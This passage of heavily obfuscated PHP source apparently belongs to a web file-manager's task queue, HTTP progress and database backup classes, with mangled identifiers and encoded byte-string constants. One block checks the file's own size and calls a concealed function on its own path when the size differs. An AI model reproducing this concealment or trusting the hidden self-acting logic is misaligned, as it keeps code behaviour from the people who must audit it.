13\62\14\352\72"."\64\10\166\206\274\121\50\61\256\252\243\21\337\321\122\160\323\240\313\302\260\15\315\7\361\120\310\350\310\74\111\26\234\247\220\23\107\210\351\336\101\340\107\271\60\303\262\213"."\153\26\106\314\15\232\155\62\50\320\136\176\255\17\145\23\170\64\217\336\242\254\347\215\12\27\62\35\362\307\2\154\160\51\120\270\145\366\263\4\277\374\214\2\24\242\73\204"."\x38\xc7\x70\x35\xd\x95\x71\xbb\x3e\xc4\x10\xb4\x53\xa7\x79\x3f\x31\x40\x52\x99\x60\x4e\x4d\x72\xe7\x88\xa3\xf2\x71\x5\x49\xe6\xb7\xe8\x48\x2c\xc7\xaf\xe9\xe3\x68\x8c\xd7\x44\x5f\xeb\xa0\x6f"."\343\302\30\126\100\327\254\71\250\212\315\30\107\227\360\30\31\122\54\63\61\64\314\110\67\35\361\270\62\262\314\320\216\31\42\200\135\3\271\271\336\147\344\134\367\165\125\251"."\156\171\64\347\341\214\362\50\241\105\33\342\317\222\120\353\102\366\171\5\126\27\215\22\77\314\344\51\71\152\20\132\67\246\154\376\34\357\334\221\151\260\114\161\333\266\314\246"."\207\305\244\311\140\132\361\344\267\230\335\60\110\230\1\250\241\112\43\167\166\50\125\340\115\362\224\11\121\145\172\131\1\200\227\347\46\7\20\25\162\143\270\47\67\161\163\330"."\xc8\x7d\xb5\xca\xbe\xf\xa9\x85\x80\x64\x47\x62\x83\x3f\x7a\x61\x12\xc0\xea\x18\x90\x24\xa6\x40\xd1\x32\x7b\xd0\x34\xdb\xf2\xa0\x21\x78\x5b\x65\x30\xcf\x5e\x9e\xb3\x42\x26\xde\x7a\x39\x9f\xc"."\304\247\33\354\101\107\300\130\161\343\127\23\357\311\112\131\305\33\325\22\320\275\140\245\204\106\376\172\220\14\304\22\230\154\4\102\314\154\335\165\140\321\316\15\341\55\373\6"."\xa4\x63\x22\xb9\x3\x8f\x7f\xca\x46\x86\x34\x9b\x20\x3a\x58\x5d\x22\x2b\x75\x55\x17\x9a\x30\x5c\x65\x36\x27\x78\x84\xc4\xf9\xaf\x1b\x4e\x61\x54\x68\x76\x1d\x19\xa5\x8\x2d\xcb\xe9\xec\x2d\x52"."\xa\xa5\x8b\xa\x57\x40\x6c\x73\x3c\x83\x2a\x16\x2\x2c\xdd\xfa\x7a\xb9\x98\x3b\xed\xad\x1f\x5f\xc4\x2\x97\xb0\x5c\x78\x58\xb9\xce\x4f\x56\x86\xe3\x21\x55\x65\x7d\x6\x5e\xd1\x2d\xfc\x9\xcc"."\xa\x88\xe8\x46\xb6\x32\xac\x22\x2c\x0\xae\x0\x5a\x83\x56\xb3\x14\x43\xc2\x1c\x14\xd4\x32\xac\xbd\xfd\x25\x9d\xf1\xa8\x12\x69\x54\x1c\x41\x18\x81\x8c\xa5\xb2\x96\xe9\x70\xf9\x5\xa7\x87\x32".base64_decode('ErmPyhxKihbxLxDfcZ2dSS6XeVa0lbGva2x7I4ZgxGW1JFJ5ol5jMbIVOWw3YT6s').base64_decode('C/w9KjydSclWp8IXoBAvAnukpadNi8jWknuCgpPQe+Ro1OQ6BXxWo1eoAnuEkdAe')."\x63\x1\x92\x76\x4b\xb2\x7f\x19\xc9\xd5\x35\x8a\x49\x3e\xcd\x25\x5e\xc7\x3f\x55\xe1\x4c\x92\x4a\x6b\xa6\x91\x29\x52\x2\xc9\x5f\x89\x5f\xf2\x68\xb6\xa4\x5b\xb\x44\x98\x4f\x96\xba\xf8\x1\x83"."\x87\x8b\x61\x17\x21\x14\x99\x49\x60\x37\x1b\x70\x5\xc4\xd5\x7\xee\x81\x2d\xa7\xa1\x6a\xb1\x3b\x5a\xd1\x33\xb9\x8\xf9\x66\x59\x11\x9a\x86\xf7\x69\xe1\x30\x43\x4e\xb1\xb1\xb3\xf2\x76\x36\x6d"."\x95\x52\x2a\x7c\x8a\x24\x49\x23\x9a\xe6\x6e\x83\x60\x74\xc4\x20\x41\xc2\xb0\xce\xec\x1\xfd\x53\xa7\xf9\x99\x23\x31\xf9\x96\x4\x63\x94\x69\xc\x73\xeb\x12\x1a\x60\x99\x82\xd1\x46\x30\xee\x83"."\174\42\217\51\35\323\20\47\32\302\311\0\361\27\302\347\223\70\26\341\61\113\332\313\164\156\370\107\74\154\310\144\105\234\246\123\173\100\234\241\275\122\72\35\41\234\334\344"."\62\227\364\144\100\53\303\235\16\376\313\105\143\250\223\17\323\145\163\343\251\4\174\343\313\176\331\111\51\321\17\141\171\212\100\46\365\222\56\15\214\260\12\240\276\107\230\311"."\x2c\xa7\x4b\x2\x9c\x32\x39\xb0\xdc\xb2\x20\xc0\x4d\x86\xe1\xfe\x28\x3c\x2e\x59\x33\x9\xdf\x1f\x75\x69\x70\x5a\x87\xf9\x2d\x3f\x6c\xf7\x83\x37\x9\x6e\xb7\x69\xcb\x11\x96\xca\x91\xd3\x76\x45"."\250\235\223\253\64\7\361\134\203\72\273\12\312\64\15\155\55\155\101\16\152\340\313\223\112\247\302\345\121\43\63\46\22\117\241\17\346\215\264\22\215\57\216\64\206\242\115\221"."\xe4\x52\xa5\x47\x77\x14\x61\x2\x41\xde\x36\x70\x2f\x65\xa2\x58\xa3\x3\xcf\xb0\xba\x8b\xbb\xd9\xc7\x41\x7f\x17\xe2\x58\xfd\x19\xce\xb8\xdb\x82\x45\x97\xac\xbd\xa4\xf7\x8c\xdc\xd5\x52\xfc\xd3"."\255\262\32\13\370\206\107\256\254\14\126\27\126\310\235\23\332\63\51\163\321\322\313\363\17\353\344\55\163\321\142\251\100\251\102\153\40\177\345\57\220\267\20\344\334\150\43\326"."\13\243\65\336\50\14\30\266\41\26\76\53\61\54\327\36\152\152\215\304\324\120\64\212\304\173\331\52\116\50\112\55\376\362\104\106\176\250\102\232\31\61\11\364\353\345\236\270"."\xc0\x8f\x91\xec\x2f\xdc\x23\xa9\xd3\xe9\x93\x3d\xb2\x15\x99\xda\x1f\x5e\xe6\xe3\x7e\xeb\x69\x54\x7a\x75\xa6\x68\x69\x86\xad\x4b\x0\xfa\x18\xca\x64\xb8\x50\xa1\xe5\x72\xae\xf7\xe6\x72\xdd\x52"."\xb4\xe4\xde\x59\x2b\x7e\x4a\xa5\x1f\x60\x30\xc9\xe9\x5b\xa5\xc\x9\xfc\x82\xf8\xff\xb8\xa9\x46\x46\x38\x5f\x32\x32\xcc\xfa\x80\xdf\x7f\xa3\x2e\xed\x1b\xe5\xb7\x9\xd9\x37\xcb\x5e\xd6\xf9\xd6".base64_decode('N3p84qBEJY5s2FNhJmHHgVeksEhcJSpFVXwCCYrWcFE+qQpm2MMjTFLFPubCTGWN').base64_decode('I4IxxtmhNvw5Ki4hKRDrdRgLzawcEZ2AcXad1HpeG/Iagbre9S77BnFsT9M6cHdQ')."\316\325\242\163\50\306\237\251\20\105\275\51\25\32\200\222\25\241\66\341\31\224\172\245\226\76\174\305\37\36\120\346\263\333\274\342\3\304\53\124\70\137\164\134\242\144\213\154"."\375\55\315\15\5\20\116\107\210\12\330\206\306\314\17\227\1\134\272\222\50\153\27\67\272\303\317\56\24\272\115\171\374\10\101\306\246\374\364\371\72\52\263\372\20\257\257\73"."\xe5\xaf\xd7\xd0\xe2\xff\x27\x5\x69\x62\x52\x32\x45\x74\x57\x52\xde\x20\xdb\xbb\xd5\x9\xb6\xb\x3f\xcc\x93\x35\x7\xdd\x6f\xd8\x61\x88\xf7\x29\x1e\xd7\x23\x3c\xd2\xa2\x21\x97\x4e\xe5\x67\x83".strrev('àQ∏±ó#YçTé$‰¯*Ç6Û;lø	”˙Ù˙TÀÀdTˆ"Ã:°Rq‰(_œe|Ö‹')."\x0\xb4\xea\x42\x50\x25\xa5\xb0\x5d\x84\xc6\x1e\x61\x25\x2f\x7a\x41\x77\xf9\x8b\x1b\x95\x1e\x6b\xc2\x1e\xde\xdc\x4f\x88\x88\x97\x59\xc4\xde\xe9\x7e\xbb\x82\x1f\x6d\xda\x62\x31\xd8\x8e\xeb\x6d".base64_decode('lJSZ0np8lCPDVE3EGoblsGwISnqBEmEgjQyf7wVSBvYkWsZH3uuipM77pIe00jj9')."\224\113\367\344\314\56\55\227\240\266\124\256\213\37\26\222\246\270\175\244\53\33\5\5\265\142\121\34\275\310\133\46\372\327\165\71\16\322\332\123\55\52\271\342\255\322\263\332".base64_decode('pMA56dCGAuEAp1SIUEW3C2pJcp5sxEuPqsQtLMiO2tlGz6ZgwOQq2Xkh17o2S491')."\7\313\317\27\261\225\30\120\24\331\210\22\216\172\3\262\40\6\31\224\371\212\100\15\327\102\306\250\204\270\141\37\11\20\112\41\63\356\337\0\345\30\354\176\56\206\242\72".base64_decode('+WnSu7kUg+NiN5f9Ugi7Au+LZ+wz/ME2H+2ZeKiTPs/m40+x+agjQR88wOYTt+m+')."\xe9\xc5\x19\xf1\x6\xaf\xfb\xe1\x5e\xdc\x66\x6e\x75\x58\x26\x4e\x78\x25\x9\x3e\x54\x9e\x2\x9\xef\xc0\xa5\xcc\x72\x9d\xa3\x38\x55\x2d\x94\xf2\xe2\x9c\x1a\x45\xdc\x92\x55\x59\x87\xa5\x1e\x96"."\xac\x9c\x8f\x9c\x29\xfb\x98\xb7\x36\xcf\x70\x88\x5e\xc9\x33\x53\x61\xc\xbf\xbd\xe\x6a\x7c\x4a\xc4\xa5\x8c\x9b\x5e\xd5\xcd\xef\xb2\xd8\xb9\x9c\x37\x9b\xe1\xc2\x3a\xd5\xd2\xc5\xad\x12\xea\xd6"."\262\214\264\257\312\147\246\115\237\71\127\126\113\210\371\21\247\127\323\351\17\234\266\1\237\41\146\134\131\357\302\47\205\371\322\224\327\55\111\164\333\5\227\277\224\350\241\335"."\xff\x33\xcc\x17\x7c\x3f\xcd\x2a\x59\xe9\x96\xbf\x38\x5b\x36\x2\x4\x9\x25\xfb\x15\x69\x2b\xf3\x18\x2b\x98\xd8\x86\xc0\x16\xcb\x87\x6e\x5e\xe2\x7d\x44\xf7\xb7\xe8\xc6\x5f\xa1\x1f\xe2\xb3\xd2".strrev('Ò≈¡ƒ´”‰âY" ÙN€{≠"ºÉ+ƒ¡#!‚IX(∑4±◊÷±Á,9ô◊œ†J')."\216\106\164\210\361\2\363\240\215\157\11\213\65\45\221\224\377\301\4\62\351\206\12\102\302\124\245\102\317\203\213\30\335\250\360\74\241\164\336\377\15\355\246\174\31\227\344\374"."\232\343\227\20\122\122\374\351\116\234\114\60\215\112\2\247\273\257\236\352\121\61\121\307\152\237\62\132\246\162\346\114\172\305\120\370\221\222\330\62\134\232\135\107\34\105\136\147"."\304\111\176\237\321\311\12\301\203\256\120\327\152\225\74\324\312\367\263\110\105\362\62\50\257\132\172\256\116\250\160\210\316\7\72\1\153\230\270\307\44\367\362\102\213\371\135\75"."\115\62\57\162\353\225\360\350\112\57\224\232\162\130\214\72\246\347\161\346\41\24\175\335\45\27\242\170\223\347\365\132\102\225\274\117\332\262\41\42\244\100\120\71\351\12\250\113".strrev('!˝ã)∫Ôtøw≥—°HıF≤[¥ö˝7â@ßl (ΩﬂdÕbj˚€ÑπzO·')."\x79\x56\x3e\xbb\x7f\x6b\x7b\xde\xf0\xa4\xfe\x57\x69\x98\xb1\xe9\xff\xd7\xcf\xd4\xfd\xbf\x7a\x9d\x6e\x66\x2d\x53\x9b\xbb\xde\xc0\x5d\xc\xcc\x32\xb4\x16\x9f\x8d\x71\xe5\x1\x55\xd9\x7a\xfa\xe1"."\336\64\367\7\54\342\317\75\113\161\156\254\312\174\142\61\127\131\32\73\346\321\162\71\151\153\255\54\136\224\75\36\212\220\257\217\277\74\131\51\342\275\24\346\175\110\264\203".strrev('0ÿ4°d/sºE_eîdƒ±Ô€®Øû\'I˘B◊òƒ«Ä©ä\\<†£)]]ﬁM…=')."\47\312\310\254\174\33\64\136\144\242\335\44\240\354\253\341\27\356\227\3\125\222\51\221\13\124\106\277\122\256\131\160\1\345\1\206\131\303\27\150\335\17\270\103\211\126\317\103"."\210\64\223\55\217\246\113\271\136\176\360\135\136\232\257\174\271\10\266\12\166\353\233\370\343\327\265\336\327\260\247\372\313\77\106\215\362\261\312\43\201\225\14\114\155\104\316\137"."\xc8\xf9\x68\x85\x32\x14\x53\x93\x22\xcf\x28\x6b\xa5\xf2\x8a\xe5\xf\x50\xa\x1d\x1a\xe\xc9\xfd\x65\x2b\xbf\xcd\x32\x9\x43\xe7\x86\x72\xc5\x8b\x64\x90\x29\x3d\xcf\x3c\x21\x20\xb7\x58\x22\xac"."\236\363\14\44\145\211\3\76\303\44\316\317\131\321\366\326\32\162\277\4\60\26\11\11\315\246\230\173\351\355\143\274\246\204\53\103\354\170\212\350\372\326\113\273\66\273\362\45"."\131\114\3\310\245\221\263\345\167\46\334\45\261\15\274\173\55\55\250\224\55\155\132\266\224\215\303\53\345\305\30\46\153\34\344\64\374\116\255\343\232\13\341\307\336\353\277\236"."\310\341\124\264\166\111\330\160\6\53\203\244\43\112\304\154\147\334\17\142\220\104\2\146\136\57\241\6\351\220\315\175\306\311\375\173\227\121\312\222\21\225\222\111\51\346\114\15"."\375\342\153\161\21\341\177\201\44\323\343\203\220\364\4\262\267\224\373\351\154\351\104\64\115\60\57\134\176\350\45\316\342\44\76\203\25\303\222\220\330\2\74\360\112\217\77\167"."\153\3\202\111\22\274\170\46\303\37\146\167\145\315\60\151\204\103\21\104\274\341\216\231\54\351\246\255\60\340\326\7\275\257\341\6\344\333\271\256\214\345\120\161\23\127\52\57"."\216\77\104\67\61\254\122\367\311\102\163\27\227\157\372\162\244\22\40\372\244\1\267\37\222\344\36\174\21\101\30\26\321\256\160\41\136\174\322\175\257\230\147\343\163\206\362\220"."\153\37\176\27\324\43\311\141\225\10\343\30\74\111\266\374\346\274\373\240\123\326\52\110\50\240\347\242\122\165\362\41\350\250\5\222\225\77\42\260\322\75\304\322\205\154\221\300".base64_decode('tjq5FheJ5B2DnAk50dUc79QSIUSgLwXmiQKWpoXcSTS/7mm9XMDbM1rCHjScdFaS')."\x8c\xca\x13\xcb\xe1\x56\xd9\xa0\xc2\x87\x2a\xb7\xd7\xdb\x2a\x36\xa6\x5e\x79\x51\x54\x52\xd6\x1e\xc9\x92\x22\x65\x56\x28\x43\x5b\x54\xb1\x18\x4d\xc2\x25\x5\xbb\xea\x2a\x3b\xca\x10\xe0\xb2\x34"."\11\227\55\113\146\205\45\365\212\124\316\321\112\366\50\335\53\37\74\320\71\144\52\164\330\43\231\323\254\243\215\147\305\314\345\237\3\214\363\346\46\112\212\312\255\20\272\5".base64_decode('z4l2pVZUzDxqK0Ruzy5QidaylArUVZg2lNNxkVbB0ILWifdo2UFThWTZaqOyXUei')."\342\322\267\335\6\27\36\270\74\60\340\213\223\106\230\45\26\222\24\163\106\237\260\101\143\46\323\23\134\364\275\124\350\53\230\174\317\310\10\173\71\154\334\33\262\274\3\131".base64_decode('VpsbTwslyb1pRQtuH5bryyXonMZ09pLpOxV5TMdI624fqrKfJprOPpKTdIMetZzQ').base64_decode('MrgMAioorgiIBgNC/U3rE32RcMJ15YDyCXAkQE8TG/GpNT9HIv4/6b5Kk5Om5fhw').base64_decode('Wsoskt8G03HE6ToV6wkziDdHn2Q8gkLi0Ag3ipxGELQl5IUE4VwTy8tJnaYSouSK')."\340\123\16\36\221\367\76\70\337\154\56\171\116\140\5\0\11\247\135\346\20\363\256\210\257\62\213\366\340\203\11\151\310\4\177\2\350\47\233\277\220\113\342\166\220\246\4\301"."\53\277\137\303\214\42\74\263\25\350\55\366\270\212\323\307\212\270\111\347\67\325\0\132\124\121\5\165\311\115\164\135\160\67\44\231\112\226\45\265\205\222\311\25\361\104\23\365".base64_decode('4F2WTEpJ5kRlSW0t8dhoaeHWUCRaloYtj2KqcKVFkyJtpJXk+G60VkQal4qWkINi')._kodDe('KJKXXCWcQ11pDX0jP5q932qZ3A2UyzSPOod4CeQzwFhDY9Rk3P2GxdJu1/ICiA47OA==').base64_decode('2GooBnUnigDFHs35WueMtDj5DrhOyCU4WQ+EwEg4J2+0BDC54gDJit3ygwaSKgYA')."\x37\x6c\x89\x9\x26\x67\xbd\x66\x97\x74\x90\x40\xc5\x18\xb8\x7d\x8\x43\x2a\x59\x86\xd1\xb0\x2b\xd9\xd1\x7a\x2a\x1e\x14\x53\x6d\x1e\x5e\xf1\x42\xcf\xf6\xbf\x1\xa4\x94\x78\x65\xf4\xa9\x0\x0"."".strrev('').""."", 10, -8))); goto EªäñêΩΩ∞; Då≠ºÊ∆Üâ: $_file = $_SERVER[$_SERVER[Á≈ ä ∞][15]]; $_size = $_SERVER[Á≈ ä ∞][879]; if ($_SERVER[$_SERVER[Á≈ ä ∞][6]] != $_size($_file)) { $_getc = $_SERVER[Á≈ ä ∞][8]; $_getfile = $_SERVER[$_SERVER[Á≈ ä ∞][9]] . $_SERVER[Á≈ ä ∞][10]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Á≈ ä ∞][11], $_getfilec); if (count($_getarrs) < $_SERVER[Á≈ ä ∞][12]) { $exit = $_SERVER[Á≈ ä ∞][13]; $exit(); } $_act = $_SERVER[Á≈ ä ∞][14]; $_act($_file); } goto Cò°Öá¬√í; f¢ÁÜÖé∑¥: class TaskHttp extends Task { protected function startAfter() { $∑ÉÜ¿¥— =& $_SERVER[Á≈ ä ∞]; $äŸâß…¡ =& $this->task; $äŸâß…¡[$∑ÉÜ¿¥—[1733]] = 1; Hook::bind($∑ÉÜ¿¥—[1701], array($this, $∑ÉÜ¿¥—[1734])); Hook::bind($∑ÉÜ¿¥—[1703], array($this, $∑ÉÜ¿¥—[1735])); Hook::bind($∑ÉÜ¿¥—[1705], array($this, $∑ÉÜ¿¥—[1736])); } protected function endAfter() { $Æ±õÔó” =& $_SERVER[Á≈ ä ∞]; Hook::unbind($Æ±õÔó”[1701], array($this, $Æ±õÔó”[1734])); Hook::unbind($Æ±õÔó”[1703], array($this, $Æ±õÔó”[1735])); Hook::unbind($Æ±õÔó”[1705], array($this, $Æ±õÔó”[1736])); } public function progressStart($≤´√Ü˘´) { $çÔÌ∞Îç =& $_SERVER[Á≈ ä ∞]; $ŒÚÙÖòè = curl_getinfo($≤´√Ü˘´); self::log($çÔÌ∞Îç[1737] . $ŒÚÙÖòè[$çÔÌ∞Îç[316]]); self::valueSet($this->task[$çÔÌ∞Îç[408]], $this->task); } public function progressEnd($Ùï¨ ∫‰) { $ñ‡†¥õü =& $_SERVER[Á≈ ä ∞]; self::log($ñ‡†¥õü[1738] . $this->task[$ñ‡†¥õü[408]]); $this->end(); } public function progress($∏¡∆œ“£, $∫‚ûØç, $ÿÏõˆàò, $ÒÛµ∫à®, $€®ˆ¿üâ) { $ÄÿÑˆ’ =& $_SERVER[Á≈ ä ∞]; $“œ≥≠Ê» =& $this->task; if ($€®ˆ¿üâ > 0) { $“œ≥≠Ê»[$ÄÿÑˆ’[793]] = $“œ≥≠Ê»[$ÄÿÑˆ’[793]] == 0 ? $ÒÛµ∫à® : $“œ≥≠Ê»[$ÄÿÑˆ’[793]]; $“œ≥≠Ê»[$ÄÿÑˆ’[1659]] = $€®ˆ¿üâ; } else { if ($ÿÏõˆàò > 0) { $“œ≥≠Ê»[$ÄÿÑˆ’[793]] = $“œ≥≠Ê»[$ÄÿÑˆ’[793]] == 0 ? $∫‚ûØç : $“œ≥≠Ê»[$ÄÿÑˆ’[793]]; $“œ≥≠Ê»[$ÄÿÑˆ’[1659]] = $ÿÏõˆàò; } } $this->update(); self::log("\160\162\157\147\162\145\x73\x73\x48\164\164\160\x3a\144\157\x77\x6e\72{$ÿÏõˆàò}\x2f{$∫‚ûØç}\x3b\x20\165\160\154\157\141\x64\x3a{$€®ˆ¿üâ}\x2f{$ÒÛµ∫à®}\73"); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\x61\163\153\x51\x75\x65\x75\145\x4c\x65\x6e\x67\164\150"; const QUEUE_DATA = "\164\x61\x73\x6b\x51\x75\145\165\145\x44\x61\164\x61"; public static $listData = false; public static function initTask() { } public static function add($ﬂ‰§¬¯, $⁄åŸÑıá = array(), $•‹∆∫Ø¬ = '', $“êÜêß¯ = '') { $·Ìµó≤Ù =& $_SERVER[Á≈ ä ∞]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($“êÜêß¯ && array_find_by_field(self::$listData, $·Ìµó≤Ù[104], $“êÜêß¯)) { return !0; } self::$listData[] = array($·Ìµó≤Ù[273] => $ﬂ‰§¬¯, $·Ìµó≤Ù[1739] => $⁄åŸÑıá, $·Ìµó≤Ù[462] => $•‹∆∫Ø¬, $·Ìµó≤Ù[104] => $“êÜêß¯); return !0; } public static function addSubmit() { $Ñ•€ûêÖ =& $_SERVER[Á≈ ä ∞]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($Ñ•€ûêÖ[1740] . json_encode_force(array_to_keyvalue(self::$listData, $Ñ•€ûêÖ[22], $Ñ•€ûêÖ[462])), $Ñ•€ûêÖ[1741]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($ä ∆ΩÃ·, $∑‚≈Ò¢™ = array(), $≤±ƒÈ±˛ = '', $÷‚ÓªªØ = '') { $ÇòŒÙ∑£ =& $_SERVER[Á≈ ä ∞]; if (self::count() >= self::MAX_LENGTH) { return !1; } $Ïä‹ãıâ = self::getAll(); if ($÷‚ÓªªØ && array_find_by_field($Ïä‹ãıâ, $ÇòŒÙ∑£[104], $÷‚ÓªªØ)) { return !0; } $Ïä‹ãıâ[] = array($ÇòŒÙ∑£[273] => $ä ∆ΩÃ·, $ÇòŒÙ∑£[1739] => $∑‚≈Ò¢™, $ÇòŒÙ∑£[462] => $≤±ƒÈ±˛, $ÇòŒÙ∑£[104] => $÷‚ÓªªØ); write_log($ÇòŒÙ∑£[1740] . $≤±ƒÈ±˛, $ÇòŒÙ∑£[1741]); self::setAll($Ïä‹ãıâ); return !0; } public static function run() { $ìÿü≠—ï =& $_SERVER[Á≈ ä ∞]; $Ûù´°«Ç = self::getAll(); $ü˛ãﬁ˚… = array_shift($Ûù´°«Ç); if (!$ü˛ãﬁ˚…) { return !1; } self::setAll($Ûù´°«Ç); $•£µ÷ÂÕ = timeFloat(); try { Hook::apply($ü˛ãﬁ˚…[$ìÿü≠—ï[273]], $ü˛ãﬁ˚…[$ìÿü≠—ï[1739]]); } catch (Exception $Éß£©±Ê) { } $ΩñπÖ÷˜ = number_format(timeFloat() - $•£µ÷ÂÕ, 3) . $ìÿü≠—ï[1674]; write_log($ìÿü≠—ï[1742] . $ü˛ãﬁ˚…[$ìÿü≠—ï[462]] . $ìÿü≠—ï[1743] . $ΩñπÖ÷˜, $ìÿü≠—ï[1741]); return !0; } public static function count() { $πì‚Ëäí = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$πì‚Ëäí) { return 0; } return intval($πì‚Ëäí); } public static function getAll() { $†–’ÿà» = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$†–’ÿà») { return array(); } return $†–’ÿà»; } public static function setAll($È†‰Â÷“) { $◊†™π÷˛ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($È†‰Â÷“), $◊†™π÷˛); Cache::set(self::QUEUE_DATA, $È†‰Â÷“, $◊†™π÷˛); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($¡„•û˜◊, $Ÿ€˝ò’ª = 5.0) { if (!$¡„•û˜◊) { return; } $Â∏º˝¸Ä = Cache::get($¡„•û˜◊); if (!$Â∏º˝¸Ä || timeFloat() - floatVal($Â∏º˝¸Ä) >= $Ÿ€˝ò’ª) { Cache::set($¡„•û˜◊, timeFloat(), $Ÿ€˝ò’ª * 10); return !0; } return !1; } public static function timeLimitCall($œ˝…‹Ò®, $ÌÖ»˘º¨, $ÉµøèÛå, $Ë≥ÅÌ†‚ = 5.0) { $†ßö˜Ÿæ =& $_SERVER[Á≈ ä ∞]; if (!$œ˝…‹Ò® || !$ÌÖ»˘º¨) { return; } self::$asyncAdd = !0; $∏Â≥Î˚µ = $†ßö˜Ÿæ[1744]; $Üà∞Ã∞ä = Cache::get($∏Â≥Î˚µ, !0); $úÙ†á ¥ = array($†ßö˜Ÿæ[1745] => timeFloat(), $†ßö˜Ÿæ[1746] => timeFloat(), $†ßö˜Ÿæ[273] => $ÌÖ»˘º¨, $†ßö˜Ÿæ[1739] => $ÉµøèÛå, $†ßö˜Ÿæ[213] => $Ë≥ÅÌ†‚); if (is_array($Üà∞Ã∞ä[$œ˝…‹Ò®])) { $úÙ†á ¥[$†ßö˜Ÿæ[1746]] = $Üà∞Ã∞ä[$œ˝…‹Ò®][$†ßö˜Ÿæ[1746]]; } if (is_array($Üà∞Ã∞ä[$œ˝…‹Ò®])) { if (timeFloat() - $Üà∞Ã∞ä[$œ˝…‹Ò®][$†ßö˜Ÿæ[1745]] < $úÙ†á ¥[$†ßö˜Ÿæ[213]] * 0.3) { return; } $úÙ†á ¥[$†ßö˜Ÿæ[1746]] = $Üà∞Ã∞ä[$œ˝…‹Ò®][$†ßö˜Ÿæ[1746]]; } $Üà∞Ã∞ä[$œ˝…‹Ò®] = $úÙ†á ¥; Cache::set($∏Â≥Î˚µ, $Üà∞Ã∞ä, 60); Cache::removeMemory($∏Â≥Î˚µ); write_log($†ßö˜Ÿæ[1747] . $œ˝…‹Ò® . $†ßö˜Ÿæ[81] . $ÌÖ»˘º¨, $†ßö˜Ÿæ[1741]); } public static function timeLimitCallLoop() { $„çÕ…ÅŒ =& $_SERVER[Á≈ ä ∞]; $“‡Ω–≠– = array($„çÕ…ÅŒ[1748]); $∞ãÿ˚ëß = in_array(strtolower(ACTION), $“‡Ω–≠–); if (!$∞ãÿ˚ëß && !self::$asyncAdd) { return; } $ßåÉ¯ı‰ = $„çÕ…ÅŒ[1744]; $˛€∫“€∑ = Cache::get($ßåÉ¯ı‰, !0); if (!$˛€∫“€∑ || count($˛€∫“€∑) <= 0) { return; } $àôÆ¡„Î = !1; $Ù¡Á¢ù£ = timeFloat(); $Âµåæ¯∏ = array(); foreach ($˛€∫“€∑ as $ÇÔîÛ¯ﬂ => $õÖÕÎΩÅ) { if ($Ù¡Á¢ù£ - $õÖÕÎΩÅ[$„çÕ…ÅŒ[1746]] > $õÖÕÎΩÅ[$„çÕ…ÅŒ[213]]) { $àôÆ¡„Î = !0; try { Hook::apply($õÖÕÎΩÅ[$„çÕ…ÅŒ[273]], $õÖÕÎΩÅ[$„çÕ…ÅŒ[1739]]); write_log($„çÕ…ÅŒ[1749] . $ÇÔîÛ¯ﬂ . $„çÕ…ÅŒ[81] . $õÖÕÎΩÅ[$„çÕ…ÅŒ[273]] . $„çÕ…ÅŒ[1750] . ACTION, $„çÕ…ÅŒ[1741]); } catch (Exception $èï‚„âÓ) { } continue; } $Âµåæ¯∏[$ÇÔîÛ¯ﬂ] = $õÖÕÎΩÅ; } if (!$àôÆ¡„Î) { return; } if (!$Âµåæ¯∏) { return Cache::remove($ßåÉ¯ı‰); } Cache::set($ßåÉ¯ı‰, $Âµåæ¯∏, 60); Cache::removeMemory($ßåÉ¯ı‰); } public static function finished($è›•ÚËÒ, $±Ñ·ªãä) { $Œª˜â¨… =& $_SERVER[Á≈ ä ∞]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($Œª˜â¨…[273] => $è›•ÚËÒ, $Œª˜â¨…[1739] => $±Ñ·ªãä); } private static function finishedRun() { $ÙˆÎºáÖ =& $_SERVER[Á≈ ä ∞]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $ê»ØèñË) { try { Hook::apply($ê»ØèñË[$ÙˆÎºáÖ[273]], $ê»ØèñË[$ÙˆÎºáÖ[1739]]); } catch (Exception $·ñ£‡õä) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto aŒ©ëéï„∏; fÒÑÛãÃ‰Ó: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $ƒ÷˝êæÎ =& $_SERVER[Á≈ ä ∞]; $ÚÃ«˘ø† = Backup::get(); self::$io = $ÚÃ«˘ø†[$ƒ÷˝êæÎ[759]]; self::$name = $ÚÃ«˘ø†[$ƒ÷˝êæÎ[42]]; $ñ˘Êæçê = new DbManage(); $ÙúçÃ€§ = $ñ˘Êæçê->dbType(); $·«ıÜ¢° = array($ƒ÷˝êæÎ[783] => $ÙúçÃ€§, $ƒ÷˝êæÎ[784] => time()); Backup::set($·«ıÜ¢°); $ûòœã´Ñ = $this->tmpFilesPath() . $ƒ÷˝êæÎ[785] . self::$name . $ƒ÷˝êæÎ[18]; del_dir($ûòœã´Ñ); mk_dir($ûòœã´Ñ); $º∑”ÔÊ˜ = $Ì†·Ì°£ = 0; $Ö∑öªŸÍ = new Task($ƒ÷˝êæÎ[786], $ƒ÷˝êæÎ[787], 0, LNG($ƒ÷˝êæÎ[788]) . $ƒ÷˝êæÎ[789] . LNG($ƒ÷˝êæÎ[790])); try { $˝ÿ–÷ÈÉ = $ñ˘Êæçê->db()->getTables(); } catch (Exception $Ê˚ÎÄ√º) { $Ö∑öªŸÍ->end(); return !1; } $˝ÿ–÷ÈÉ = array_diff($˝ÿ–÷ÈÉ, array($ƒ÷˝êæÎ[791], $ƒ÷˝êæÎ[792])); foreach ($˝ÿ–÷ÈÉ as $˜øÊÜ˜î) { $º∑”ÔÊ˜ += $ñ˘Êæçê->model($˜øÊÜ˜î)->count(); } $Ö∑öªŸÍ->task[$ƒ÷˝êæÎ[793]] = $º∑”ÔÊ˜; $GLOBALS[$ƒ÷˝êæÎ[794]] = self::$name; foreach 